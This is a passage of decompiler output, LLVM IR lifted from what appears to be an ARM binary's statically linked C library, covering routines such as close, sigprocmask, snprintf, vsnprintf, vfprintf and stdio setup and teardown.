  br i1 %tmp, label %dec_label_pc_14300, label %dec_label_pc_142f0

dec_label_pc_142f0:                               ; preds = %entry
  %v0_142f0 = call i32 @__GI___errno_location()
  %v0_142f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_142f4 = sub i32 0, %v0_142f4
  store i32 %v1_142f4, i32* @r3, align 4
  %v2_142f8 = inttoptr i32 %v0_142f0 to i32*
  store i32 %v1_142f4, i32* %v2_142f8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14300

dec_label_pc_14300:                               ; preds = %entry, %dec_label_pc_142f0
  %v0_14300 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_142f0 ]
  ret i32 %v0_14300

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14300, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14318.outer

dec_label_pc_14318.outer:                         ; preds = %dec_label_pc_14330, %entry
  %v0_14318.ph = phi i32 [ %v0_14318.pre.pre, %dec_label_pc_14330 ], [ %arg1, %entry ]
  %tmp = icmp ult i32 %v0_14318.ph, -4095
  br label %dec_label_pc_14318

dec_label_pc_14318:                               ; preds = %dec_label_pc_14318.outer, %dec_label_pc_14318
  br i1 %tmp, label %dec_label_pc_14318, label %dec_label_pc_14330

dec_label_pc_14330:                               ; preds = %dec_label_pc_14318
  %v0_14330 = call i32 @__GI___errno_location()
  %v1_14334 = sub i32 0, %v0_14318.ph
  %v2_14338 = inttoptr i32 %v0_14330 to i32*
  store i32 %v1_14334, i32* %v2_14338, align 4
  %v0_14318.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14318.outer

; uselistorder directives
  uselistorder i32 %v0_14318.ph, { 1, 0 }
  uselistorder label %dec_label_pc_14318, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14340 = load i32, i32* @r7, align 4
  store i32 %v3_14340, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1436c, label %dec_label_pc_1435c

dec_label_pc_1435c:                               ; preds = %entry
  %v0_1435c = call i32 @__GI___errno_location()
  %v0_14360 = load i32, i32* %r7.global-to-local, align 4
  %v1_14360 = sub i32 0, %v0_14360
  %v2_14364 = inttoptr i32 %v0_1435c to i32*
  store i32 %v1_14360, i32* %v2_14364, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_14370.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1436c

dec_label_pc_1436c:                               ; preds = %entry, %dec_label_pc_1435c
  %v2_14370 = phi i32 [ %v3_14340, %entry ], [ %v2_14370.pre, %dec_label_pc_1435c ]
  %v0_1436c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1435c ]
  store i32 %v2_14370, i32* @r7, align 4
  ret i32 %v0_1436c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1436c, { 1, 0 }
}

define i32 @__GI_close(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14378 = load i32, i32* @r7, align 4
  store i32 %v3_14378, i32* %stack_var_-8, align 4
  %v0_14384 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14384, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14384, -4095
  br i1 %tmp, label %dec_label_pc_143a4, label %dec_label_pc_14394

dec_label_pc_14394:                               ; preds = %entry
  %v0_14394 = call i32 @__GI___errno_location()
  %v0_14398 = load i32, i32* %r7.global-to-local, align 4
  %v1_14398 = sub i32 0, %v0_14398
  %v2_1439c = inttoptr i32 %v0_14394 to i32*
  store i32 %v1_14398, i32* %v2_1439c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_143a4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_143a4

dec_label_pc_143a4:                               ; preds = %entry, %dec_label_pc_14394
  %v1_143a8 = phi i32 [ %v0_14384, %entry ], [ -1, %dec_label_pc_14394 ]
  %v2_143a4 = phi i32 [ %v3_14378, %entry ], [ %v2_143a4.pre, %dec_label_pc_14394 ]
  store i32 %v2_143a4, i32* @r7, align 4
  ret i32 %v1_143a8

; uselistorder directives
  uselistorder i32 %v0_14384, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_143a4, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v4_143b8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 532) to i32*), align 4
  %v2_143bc = mul i32 %arg1, 2
  %v2_143c0 = add i32 %v4_143b8, %v2_143bc
  %v3_143c0 = inttoptr i32 %v2_143c0 to i16*
  %v4_143c0 = load i16, i16* %v3_143c0, align 2
  %v6_143c0 = zext i16 %v4_143c0 to i32
  %v1_143c4 = and i32 %v6_143c0, 32
  ret i32 %v1_143c4
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_143d8 = add i32 %arg1, 128
  %v2_143dc = icmp ugt i32 %v1_143d8, 383
  %v0_143e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_143dc, i32 %v0_143e4)
  %v4_143ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 540) to i32*), align 4
  %v2_143f0 = mul i32 %arg1, 2
  %v2_143f4 = add i32 %v4_143ec, %v2_143f0
  %v3_143f4 = inttoptr i32 %v2_143f4 to i16*
  %v4_143f4 = load i16, i16* %v3_143f4, align 2
  %v6_143f4 = sext i16 %v4_143f4 to i32
  ret i32 %v6_143f4
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r3, align 4
  ret i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 26304)
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @__GI_snprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-4, align 4
  %v2_14478 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_14478, i32* @r3, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_14488 = call i32 @__GI_vsnprintf()
  ret i32 %v0_14488

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_144a8 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_144a8, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_144bc = call i32 @__GI_vsnprintf()
  ret i32 %v0_144bc

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v3_144d0 = load i32, i32* @r4, align 4
  %v6_144d0 = load i32, i32* @r5, align 4
  %v9_144d0 = load i32, i32* @r6, align 4
  %v12_144d0 = load i32, i32* @r7, align 4
  %v18_144d0 = load i32, i32* @sl, align 4
  %v2_144d8 = ptrtoint i32* %stack_var_-112 to i32
  %v0_144dc = load i32, i32* @r0, align 4
  store i32 %v0_144dc, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v2_144e4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_144e4, i32* @r0, align 4
  %v0_144ec = load i32, i32* @r3, align 4
  store i32 %v0_144ec, i32* @r7, align 4
  store i32 1, i32* @ip, align 4
  %v0_144f8 = load i32, i32* @r1, align 4
  store i32 %v0_144f8, i32* @r5, align 4
  %v0_144fc = load i32, i32* @r2, align 4
  store i32 %v0_144fc, i32* @r6, align 4
  store i32 208, i32* %stack_var_-112, align 4
  %v1_14510 = call i32 @__stdio_init_mutex(i32 %v2_144e4)
  %v0_14514 = load i32, i32* @r4, align 4
  %v1_14514 = sub i32 -1, %v0_14514
  %v0_14518 = load i32, i32* @r5, align 4
  %v3_14518 = icmp ult i32 %v0_14518, %v1_14514
  br i1 %v3_14518, label %bb24, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_14514, i32* @r5, align 4
  br label %bb24

bb24:                                             ; preds = %entry, %bb
  %v1_14520 = phi i32 [ %v0_14518, %entry ], [ %v1_14514, %bb ]
  %v0_14528 = load i32, i32* @r6, align 4
  %v0_1452c = load i32, i32* @r7, align 4
  %v3_1454c = inttoptr i32 %v0_14528 to i8*
  %v4_1454c = call i32 @_vfprintf_internal(i32 %v2_144d8, i8* %v3_1454c, i32 %v0_1452c)
  %v0_14550 = load i32, i32* @r5, align 4
  %v1_14550 = load i32, i32* @sl, align 4
  %v9_14550 = icmp eq i32 %v0_14550, %v1_14550
  br i1 %v9_14550, label %dec_label_pc_14578, label %dec_label_pc_1455c

dec_label_pc_1455c:                               ; preds = %bb24
  %v2_14520 = add i32 %v1_14520, %v0_14514
  %v9_14564 = icmp eq i32 %v1_14520, 0
  br i1 %v9_14564, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_1455c
  %v2_14568 = add i32 %v0_14514, -1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_1455c, %bb25
  %v1_1456c = phi i32 [ %v2_14520, %dec_label_pc_1455c ], [ %v2_14568, %bb25 ]
  %v1_1456c.v0_14544 = select i1 %v9_14564, i32 %v1_1456c, i32 %v0_14514
  %stack_var_-96.0 = inttoptr i32 %v1_1456c.v0_14544 to i8*
  %v1_14574 = trunc i32 %v1_14550 to i8
  store i8 %v1_14574, i8* %stack_var_-96.0, align 1
  br label %dec_label_pc_14578

dec_label_pc_14578:                               ; preds = %bb24, %bb26
  store i32 %v3_144d0, i32* @r4, align 4
  store i32 %v6_144d0, i32* @r5, align 4
  store i32 %v9_144d0, i32* @r6, align 4
  store i32 %v12_144d0, i32* @r7, align 4
  store i32 %v18_144d0, i32* @sl, align 4
  ret i32 %v4_1454c

; uselistorder directives
  uselistorder i1 %v9_14564, { 1, 0 }
  uselistorder i32 %v1_14520, { 1, 0 }
  uselistorder i32 %v1_14514, { 2, 1, 0 }
  uselistorder i32 %v0_14514, { 3, 2, 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_14578, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
}

define i32 @_stdio_init(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_14588 = call i32 @__GI___errno_location()
  store i32 %v0_14588, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_14594 = inttoptr i32 %v0_14588 to i32*
  %v2_14594 = load i32, i32* %v1_14594, align 4
  store i32 %v2_14594, i32* @r6, align 4
  %v1_14598 = call i32 @isatty(i32 0)
  %v2_145a0 = icmp eq i32 %v1_14598, 0
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r4, align 4
  br i1 %v2_145a0, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_145ac = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 620) to i16*), align 2
  %v7_145ac = zext i16 %v5_145ac to i32
  %v2_145b0 = xor i32 %v7_145ac, 256
  store i32 %v2_145b0, i32* @r3, align 4
  %v2_145b4 = trunc i32 %v2_145b0 to i16
  store i16 %v2_145b4, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 620) to i16*), align 2
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_145bc = call i32 @isatty(i32 1)
  %v2_145c0 = icmp eq i32 %v1_145bc, 0
  br i1 %v2_145c0, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_145c8 = load i32, i32* @r4, align 4
  %v2_145cc = add i32 %v1_145c8, 700
  %v3_145cc = inttoptr i32 %v2_145cc to i16*
  %v4_145cc = load i16, i16* %v3_145cc, align 2
  %v2_145d0 = xor i16 %v4_145cc, 256
  store i16 %v2_145d0, i16* %v3_145cc, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v0_145d8 = load i32, i32* @r6, align 4
  %v1_145d8 = load i32, i32* @r5, align 4
  %v2_145d8 = inttoptr i32 %v1_145d8 to i32*
  store i32 %v0_145d8, i32* %v2_145d8, align 4
  ret i32 %v1_145bc

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r3, align 4
  store i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -37256), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_14608 = call i32 @memcpy()
  ret i32 %v0_14608
}

define i32 @_stdio_term(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14620 = load i32, i32* @r4, align 4
  store i32 %v3_14620, i32* %stack_var_-24, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* %r6.global-to-local, align 4
  %v4_14630 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 108) to i32*), align 4
  store i32 %v4_14630, i32* @r0, align 4
  %v1_14634 = call i32 @__stdio_init_mutex(i32 %v4_14630)
  store i32 %v1_14634, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_1463c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 120) to i32*), align 4
  store i32 %v4_1463c, i32* @r0, align 4
  %v1_14640 = call i32 @__stdio_init_mutex(i32 %v4_1463c)
  store i32 %v1_14640, i32* %r0.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_14648 = load i32, i32* %r6.global-to-local, align 4
  %v2_14648 = add i32 %v0_14648, 52
  %v3_14648 = inttoptr i32 %v2_14648 to i32*
  %v4_14648 = load i32, i32* %v3_14648, align 4
  store i32 %v4_14648, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r8.global-to-local, align 4
  %v1_14650 = inttoptr i32 %v4_14648 to i32*
  %v2_14650 = load i32, i32* %v1_14650, align 4
  store i32 %v2_14650, i32* @r4, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  %v1_1469c5 = add i32 %v2_14650, 56
  store i32 %v1_1469c5, i32* @r5, align 4
  %v2_146a07 = icmp eq i32 %v2_14650, 0
  store i32 %v1_1469c5, i32* %r0.global-to-local, align 4
  br i1 %v2_146a07, label %dec_label_pc_146ac, label %dec_label_pc_1465c

dec_label_pc_1465c:                               ; preds = %entry, %dec_label_pc_14690.dec_label_pc_1465c_crit_edge
  %v1_1465c = phi i32 [ %v1_1465c.pre, %dec_label_pc_14690.dec_label_pc_1465c_crit_edge ], [ 48, %entry ]
  %v0_1465c = phi i32 [ %v0_146b0.pre, %dec_label_pc_14690.dec_label_pc_1465c_crit_edge ], [ %v0_14648, %entry ]
  %v2_1465c = add i32 %v0_1465c, %v1_1465c
  %v3_1465c = inttoptr i32 %v2_1465c to i32*
  %v4_1465c = load i32, i32* %v3_1465c, align 4
  store i32 %v4_1465c, i32* @ip, align 4
  store i32 83560, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1465c)
  %v0_14668 = load i32, i32* %r0.global-to-local, align 4
  %v2_14668 = icmp eq i32 %v0_14668, 0
  %v0_1466c = load i32, i32* @r5, align 4
  store i32 %v0_1466c, i32* @r0, align 4
  br i1 %v2_14668, label %dec_label_pc_14690, label %dec_label_pc_14674

dec_label_pc_14674:                               ; preds = %dec_label_pc_1465c
  %v0_14674 = load i32, i32* @r4, align 4
  %v1_14674 = add i32 %v0_14674, 8
  %v2_14674 = inttoptr i32 %v1_14674 to i32*
  %v3_14674 = load i32, i32* %v2_14674, align 4
  store i32 %v3_14674, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v2_1467c = add i32 %v0_14674, 20
  %v3_1467c = inttoptr i32 %v2_1467c to i32*
  store i32 %v3_14674, i32* %v3_1467c, align 4
  %v0_14680 = load i32, i32* %r2.global-to-local, align 4
  %v1_14680 = trunc i32 %v0_14680 to i16
  %v2_14680 = load i32, i32* @r4, align 4
  %v3_14680 = inttoptr i32 %v2_14680 to i16*
  store i16 %v1_14680, i16* %v3_14680, align 2
  %v0_14684 = load i32, i32* %r3.global-to-local, align 4
  %v1_14684 = load i32, i32* @r4, align 4
  %v2_14684 = add i32 %v1_14684, 24
  %v3_14684 = inttoptr i32 %v2_14684 to i32*
  store i32 %v0_14684, i32* %v3_14684, align 4
  %v0_14688 = load i32, i32* %r3.global-to-local, align 4
  %v1_14688 = load i32, i32* @r4, align 4
  %v2_14688 = add i32 %v1_14688, 28
  %v3_14688 = inttoptr i32 %v2_14688 to i32*
  store i32 %v0_14688, i32* %v3_14688, align 4
  %v0_1468c = load i32, i32* %r3.global-to-local, align 4
  %v1_1468c = load i32, i32* @r4, align 4
  %v2_1468c = add i32 %v1_1468c, 16
  %v3_1468c = inttoptr i32 %v2_1468c to i32*
  store i32 %v0_1468c, i32* %v3_1468c, align 4
  br label %dec_label_pc_14690

dec_label_pc_14690:                               ; preds = %dec_label_pc_1465c, %dec_label_pc_14674
  %v0_14690 = load i32, i32* %r7.global-to-local, align 4
  %v1_14690 = load i32, i32* @r4, align 4
  %v2_14690 = add i32 %v1_14690, 52
  %v3_14690 = inttoptr i32 %v2_14690 to i32*
  store i32 %v0_14690, i32* %v3_14690, align 4
  %v1_14694 = call i32 @__stdio_init_mutex(i32 %v0_1466c)
  store i32 %v1_14694, i32* %r0.global-to-local, align 4
  %v0_14698 = load i32, i32* @r4, align 4
  %v1_14698 = add i32 %v0_14698, 32
  %v2_14698 = inttoptr i32 %v1_14698 to i32*
  %v3_14698 = load i32, i32* %v2_14698, align 4
  store i32 %v3_14698, i32* @r4, align 4
  %v1_1469c = add i32 %v3_14698, 56
  store i32 %v1_1469c, i32* @r5, align 4
  %v2_146a0 = icmp eq i32 %v3_14698, 0
  store i32 %v1_1469c, i32* %r0.global-to-local, align 4
  %v0_146b0.pre = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_146a0, label %dec_label_pc_146ac, label %dec_label_pc_14690.dec_label_pc_1465c_crit_edge

dec_label_pc_14690.dec_label_pc_1465c_crit_edge:  ; preds = %dec_label_pc_14690
  %v1_1465c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1465c

dec_label_pc_146ac:                               ; preds = %dec_label_pc_14690, %entry
  %v1_146dc14 = phi i32 [ %v1_1469c5, %entry ], [ %v1_1469c, %dec_label_pc_14690 ]
  %v0_146b0 = phi i32 [ %v0_14648, %entry ], [ %v0_146b0.pre, %dec_label_pc_14690 ]
  store i32 52, i32* %r3.global-to-local, align 4
  %v2_146b0 = add i32 %v0_146b0, 52
  %v3_146b0 = inttoptr i32 %v2_146b0 to i32*
  %v4_146b0 = load i32, i32* %v3_146b0, align 4
  store i32 %v4_146b0, i32* %r3.global-to-local, align 4
  %storemerge.in1 = inttoptr i32 %v4_146b0 to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* %r4.global-to-local, align 4
  %v2_146d04 = icmp eq i32 %storemerge2, 0
  br i1 %v2_146d04, label %dec_label_pc_146d8, label %dec_label_pc_146bc

dec_label_pc_146bc:                               ; preds = %dec_label_pc_146ac, %dec_label_pc_146d0
  %v1_146c4 = phi i32 [ %storemerge, %dec_label_pc_146d0 ], [ %storemerge2, %dec_label_pc_146ac ]
  %v1_146bc = inttoptr i32 %v1_146c4 to i16*
  %v2_146bc = load i16, i16* %v1_146bc, align 2
  %v3_146bc = zext i16 %v2_146bc to i32
  store i32 %v3_146bc, i32* %r3.global-to-local, align 4
  %v1_146c0 = and i32 %v3_146bc, 64
  %v2_146c0 = icmp eq i32 %v1_146c0, 0
  br i1 %v2_146c0, label %dec_label_pc_146d0, label %bb

bb:                                               ; preds = %dec_label_pc_146bc
  store i32 %v1_146c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_146d0

dec_label_pc_146d0:                               ; preds = %dec_label_pc_146bc, %bb
  %v1_146c8 = xor i1 %v2_146c0, true
  call void @__pseudo_cond_branch(i1 %v1_146c8, i32 ptrtoint (i32* @global_var_146f4.890 to i32))
  %v0_146cc = load i32, i32* %r4.global-to-local, align 4
  %v1_146cc = add i32 %v0_146cc, 32
  %storemerge.in = inttoptr i32 %v1_146cc to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v2_146d0 = icmp eq i32 %storemerge, 0
  br i1 %v2_146d0, label %dec_label_pc_146d0.dec_label_pc_146d8_crit_edge, label %dec_label_pc_146bc

dec_label_pc_146d0.dec_label_pc_146d8_crit_edge:  ; preds = %dec_label_pc_146d0
  %v1_146dc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_146d8

dec_label_pc_146d8:                               ; preds = %dec_label_pc_146d0.dec_label_pc_146d8_crit_edge, %dec_label_pc_146ac
  %v1_146dc = phi i32 [ %v1_146dc.pre, %dec_label_pc_146d0.dec_label_pc_146d8_crit_edge ], [ %v1_146dc14, %dec_label_pc_146ac ]
  %v2_146d8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_146d8, i32* %r4.global-to-local, align 4
  ret i32 %v1_146dc

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_14648, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 6, 0, 1, 2, 5, 7, 3, 4 }
  uselistorder label %dec_label_pc_146d0, { 1, 0 }
  uselistorder label %dec_label_pc_146bc, { 1, 0 }
  uselistorder label %dec_label_pc_14690, { 1, 0 }
  uselistorder label %dec_label_pc_1465c, { 1, 0 }
}

define i32 @function_146e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_146e4:
  %v0_146e4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_146e4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_146e4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_146e4, %bb
  %v10_146f0 = phi i32 [ %arg1, %dec_label_pc_146e4 ], [ 0, %bb ]
  ret i32 %v10_146f0

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_146f4 = load i32, i32* @r4, align 4
  store i32 %v3_146f4, i32* %stack_var_-8, align 4
  %v0_146f8 = load i32, i32* @r0, align 4
  %v1_146f8 = add i32 %v0_146f8, 8
  %v2_146f8 = inttoptr i32 %v1_146f8 to i32*
  %v3_146f8 = load i32, i32* %v2_146f8, align 4
  %v1_146fc = add i32 %v0_146f8, 16
  %v2_146fc = inttoptr i32 %v1_146fc to i32*
  %v3_146fc = load i32, i32* %v2_146fc, align 4
  %v9_14700 = icmp eq i32 %v3_146fc, %v3_146f8
  store i32 %v0_146f8, i32* %r4.global-to-local, align 4
  br i1 %v9_14700, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_146f8, i32* %v2_146fc, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_1470c = xor i1 %v9_14700, true
  call void @__pseudo_cond_branch(i1 %v1_1470c, i32 ptrtoint (i32* @global_var_19b3c.891 to i32))
  %v0_14710 = load i32, i32* %r4.global-to-local, align 4
  %v1_14710 = add i32 %v0_14710, 8
  %v2_14710 = inttoptr i32 %v1_14710 to i32*
  %v3_14710 = load i32, i32* %v2_14710, align 4
  %v1_14714 = add i32 %v0_14710, 16
  %v2_14714 = inttoptr i32 %v1_14714 to i32*
  %v3_14714 = load i32, i32* %v2_14714, align 4
  %v2_14718 = sub i32 %v3_14714, %v3_14710
  %v2_1471c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1471c, i32* @r4, align 4
  ret i32 %v2_14718

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_vfprintf() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_14724 = load i32, i32* @r4, align 4
  store i32 %v3_14724, i32* %stack_var_-28, align 4
  %v0_14728 = load i32, i32* @r0, align 4
  %v1_14728 = add i32 %v0_14728, 52
  %v2_14728 = inttoptr i32 %v1_14728 to i32*
  %v3_14728 = load i32, i32* %v2_14728, align 4
  %v1_14730 = sub i32 1, %v3_14728
  %v2_14730 = icmp ult i32 %v3_14728, 2
  br i1 %v2_14730, label %bb18, label %bb

bb:                                               ; preds = %entry
  br label %bb18

bb18:                                             ; preds = %entry, %bb
  %storemerge23 = phi i32 [ 0, %bb ], [ %v1_14730, %entry ]
  %v0_14738 = phi i32 [ 0, %bb ], [ %v1_14730, %entry ]
  store i32 %storemerge23, i32* @r7, align 4
  %v2_14738 = icmp eq i32 %v0_14738, 0
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r6, align 4
  store i32 %v0_14728, i32* @r5, align 4
  %v0_14748 = load i32, i32* @r1, align 4
  store i32 %v0_14748, i32* @sl, align 4
  %v0_1474c = load i32, i32* @r2, align 4
  store i32 %v0_1474c, i32* @r8, align 4
  br i1 %v2_14738, label %dec_label_pc_1478c, label %dec_label_pc_14754

dec_label_pc_14754:                               ; preds = %bb18
  %v1_14758 = add i32 %v0_14728, 56
  store i32 %v1_14758, i32* @r4, align 4
  %v4_1476c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1476c)
  %v0_14780 = load i32, i32* @r6, align 4
  %v2_14780 = add i32 %v0_14780, 20
  %v3_14780 = inttoptr i32 %v2_14780 to i32*
  %v4_14780 = load i32, i32* %v3_14780, align 4
  store i32 %v4_14780, i32* @ip, align 4
  store i32 83852, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14780)
  %v0_1478c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1478c

dec_label_pc_1478c:                               ; preds = %bb18, %dec_label_pc_14754
  %v0_1479c = phi i32 [ %v0_14728, %bb18 ], [ %v0_1478c.pre, %dec_label_pc_14754 ]
  %v1_1478c = inttoptr i32 %v0_1479c to i16*
  %v2_1478c = load i16, i16* %v1_1478c, align 2
  %v1_14790 = and i16 %v2_1478c, 192
  %v2_14794 = icmp eq i16 %v1_14790, 192
  br i1 %v2_14794, label %dec_label_pc_147b4, label %dec_label_pc_1479c

dec_label_pc_1479c:                               ; preds = %dec_label_pc_1478c
  %v3_147a4 = call i32 @__stdio_trans2w_o(i16* %v1_1478c, i32 128)
  %v2_147a8 = icmp eq i32 %v3_147a4, 0
  br i1 %v2_147a8, label %dec_label_pc_1479c.dec_label_pc_147b4_crit_edge, label %dec_label_pc_147c8

dec_label_pc_1479c.dec_label_pc_147b4_crit_edge:  ; preds = %dec_label_pc_1479c
  %v0_147b4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_147b4

dec_label_pc_147b4:                               ; preds = %dec_label_pc_1479c.dec_label_pc_147b4_crit_edge, %dec_label_pc_1478c
  %v0_147b4 = phi i32 [ %v0_147b4.pre, %dec_label_pc_1479c.dec_label_pc_147b4_crit_edge ], [ %v0_1479c, %dec_label_pc_1478c ]
  %v0_147b8 = load i32, i32* @sl, align 4
  %v0_147bc = load i32, i32* @r8, align 4
  %v3_147c0 = inttoptr i32 %v0_147b8 to i8*
  %v4_147c0 = call i32 @_vfprintf_internal(i32 %v0_147b4, i8* %v3_147c0, i32 %v0_147bc)
  br label %dec_label_pc_147c8

dec_label_pc_147c8:                               ; preds = %dec_label_pc_1479c, %dec_label_pc_147b4
  %storemerge = phi i32 [ %v4_147c0, %dec_label_pc_147b4 ], [ -1, %dec_label_pc_1479c ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v0_147c8 = load i32, i32* @r7, align 4
  %v2_147c8 = icmp eq i32 %v0_147c8, 0
